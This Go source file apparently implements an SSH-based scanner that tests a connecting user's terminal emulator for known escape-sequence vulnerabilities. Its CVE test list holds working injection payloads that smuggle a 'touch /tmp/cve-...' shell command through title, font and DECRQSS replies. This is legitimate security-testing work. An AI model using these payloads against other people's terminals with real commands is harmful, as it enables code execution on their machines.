package main

// SPDX-License-Identifier: AGPL-3.0-or-later

import (
	"fmt"
	"io"
	"log"
	"strings"
	"time"

	"github.com/gliderlabs/ssh"
)

func sshServer() {
	ssh.Handle(func(s ssh.Session) {
		ptyReq, winCh, isPty := s.Pty()
		if isPty {
			log.Printf("New connection")
			data := map[string]string{}
			data["TERM"] = ptyReq.Term
			// XXX: nonblocking?
			win := <-winCh
			data["WINSIZE"] = fmt.Sprint(win)

			// Basically all ANSI terminals support this, use this to check replies
			// work.
			io.WriteString(s, "\x1B[6n")
			seq := parseANSISeq(s)
			if len(seq) > 0 { // => we have an ANSI terminal.
				io.WriteString(s, "[\x1b[1;32m*\x1b[0m] Terminal testing; please \x1b[34mwait\x1b[0m (and don't touch anything)...\n")

				n := trySeqs(s, basicTests, data)
				io.WriteString(s, "[-] Got "+fmt.Sprintf("%d", n)+" replies\n")
				log.Printf("%#v", data)
				if _, ok := data["XTVERSION"]; ok {
					io.WriteString(s, fmt.Sprintf("[-] XTVERSION=%q\n", strings.TrimSuffix(data["XTVERSION"][4:], "\x1b\\")))
				}
				io.WriteString(s, fmt.Sprintf("[?] debug, present this better later... %#v\n", data))

				io.WriteString(s, "[\x1b[1;32m*\x1b[0m] Now testing for security issues; please \x1b[34mwait\x1b[0m (and don't touch anything)...\n")
				n = trySeqs(s, cveTests, data)
				io.WriteString(s, "[-] Got "+fmt.Sprintf("%d", n)+" replies\n")
				maybe := 0
				for key, str := range data {
					if strings.HasPrefix(key, "CVE-") {
						if strings.Contains(str, "cve") {
							io.WriteString(s, fmt.Sprintf("[\x1b[1;31m!\x1b[0m] Potentially vulnerable to %v (got %q as reply)\n", key, str))
							maybe++
						}
					}
				}

				if maybe == 0 {
					io.WriteString(s, "[-] No known and detectable security issues found.\n")
				}
				io.WriteString(s, "[-] "+versionString()+"\n\n")
			}
		} else {
			io.WriteString(s, "No PTY requested. You must run ssh without a command (or use -t).\n")
			s.Exit(1)
		}
	})

	log.Println("Starting ssh server on port 2222...")
	log.Fatal(ssh.ListenAndServe(":2222", nil, ssh.HostKeyFile("host_key")))
}

func parseANSISeq(s ssh.Session) []byte {
	// Shoddy escape sequence parsing here, but we're only testing for
	// security, not being secure ourselves, right?
	// XXX: we actually do need a proper state machine though.
	inEsc := false
	inCsi := false
	inOsc := false
	inOscEnd := false
	inDcs := false
	inDcsEnd := false
	var escSeq []byte
	for {
		buf := make([]byte, 1)
		n, err := s.Read(buf)
		if n != 1 || err != nil {
			log.Print("Lost connection")
			break
		}

		if !inEsc && buf[0] == '\x1B' {
			escSeq = append(escSeq, buf...)
			inEsc = true
		} else if inDcs {
			escSeq = append(escSeq, buf...)
			if inDcsEnd {
				break
			}
			if buf[0] == '\x1B' {
				inDcsEnd = true
			}
		} else if inOsc {
			escSeq = append(escSeq, buf...)
			if inOscEnd {
				break
			}
			if buf[0] == '\x1B' {
				inOscEnd = true
			}
			if buf[0] == '\x07' {
				break
			}
		} else if inEsc && len(escSeq) == 1 && buf[0] == '[' { // CSI
			inCsi = true
			escSeq = append(escSeq, buf...)
		} else if inEsc && len(escSeq) == 1 && buf[0] == 'P' { // DCS
			inDcs = true
			escSeq = append(escSeq, buf...)
		} else if inEsc && len(escSeq) == 1 && buf[0] == ']' { // OSC
			inOsc = true
			escSeq = append(escSeq, buf...)
		} else if inCsi && buf[0] >= 'A' { // End of CSI (XXX: not spec compliant; this works for things we care about for now).
			escSeq = append(escSeq, buf...)
			inEsc = false
			break
		} else if inEsc {
			escSeq = append(escSeq, buf...)
		}
	}
	return escSeq
}

type Test struct {
	Name     string
	Sequence string
	Timeout  time.Duration
	Response string
}

const DefaultTimeout = 2 * time.Second

var basicTests = []Test{
	{"ENQ", "\x05\x7F", DefaultTimeout, ""},
	{"DSR", "\x1b[6n", DefaultTimeout, ""},
	{"DSR??", "\x1b[?6n", DefaultTimeout, ""}, // XXX?
	{"DECREQTPARM", "\x1b[x", DefaultTimeout, ""},
	{"DA", "\x1b[c", DefaultTimeout, ""},
	{"DA2", "\x1b[>c", DefaultTimeout, ""},
	{"DA3", "\x1b[=c", DefaultTimeout, ""},
	{"DECRQCRA", "\x1b[0;0;0;1;0;1*y", DefaultTimeout, ""},
	{"XTVERSION", "\x1b[>q", DefaultTimeout, ""},
	{"TITLE", "\x1b[21t", DefaultTimeout, ""},
	{"DECRQSS_SGR", "\x1bP$qm\x1b\\", DefaultTimeout, ""},
}

var cveTests = []Test{
	// Xterm title reporting
	{"CVE-2003-0063", "\x1b]0;touch /tmp/cve-2003-0063\a\x1b[21t", DefaultTimeout, "cve-2003-0063"},
	// DECRQSS. This doesn't have a newline even though it could, as the variant in iTerm2 and Kitty
	// can't be detected if we add control characters.
	{"CVE-2008-2383", "\x1bP$q;touch /tmp/cve-2008-2383\x1b\\", DefaultTimeout, "cve-2008-2383"},
	// iterm2 tmux?
	// Xterm.js (variant of ???)
	{"CVE-2019-0542", "\x1bP+qfoo;\ntouch /tmp/cve-2019-0542;aa\n\x1b\\", DefaultTimeout, "cve-2019-0542;aa\n"},
	// rxvt-unicode "graphics"
	{"CVE-2021-33477", "\x1bG", DefaultTimeout, "\n"},
	// xterm font OSC
	{"CVE-2022-45063", "\x1b]50;$(touch /tmp/cve-2022-45063)\a\x1b]50;?\a", DefaultTimeout, "cve-2022-45063)\a"},
	// conemu title
	{"CVE-2022-46387", "\x1b]0;\rtouch /tmp/cve-2022-46387\r\a\x1b[21t", DefaultTimeout, "cve-2022-46387\r"},
	// iterm2 DECRQSS
	{"CVE-2022-45872", "\x1bP$q;touch /tmp/cve-2022-45872\n\x1b\\\n\x1bP$qm\x1b\\", DefaultTimeout, "cve-2022-45872\n"},
	// kitty file XXX

	// XXX: Hack, consider doing this as part of trySeqs?
	// Catch late replies.
	{"pad", "", DefaultTimeout, "\x1B"},
}

func trySeqs(s ssh.Session, cc []Test, data map[string]string) int {
	count := 0
	for _, t := range cc {
		io.WriteString(s, t.Sequence)
		cancel := make(chan struct{})
		timeout := make(chan struct{})
		if t.Timeout > 0 {
			go func() {
				select {
				case <-time.After(t.Timeout):
					io.WriteString(s, "\x1B[6n")
					timeout <- struct{}{}
				case <-cancel:
				}
			}()
		}
		seq := parseANSISeq(s)
		timedOut := false
		select {
		case <-timeout:
			timedOut = true
		default:
			cancel <- struct{}{}
		}
		log.Printf("%q %v", seq, timedOut)
		if !timedOut {
			data[t.Name] = string(seq)
			count++
		}
	}
	return count
}
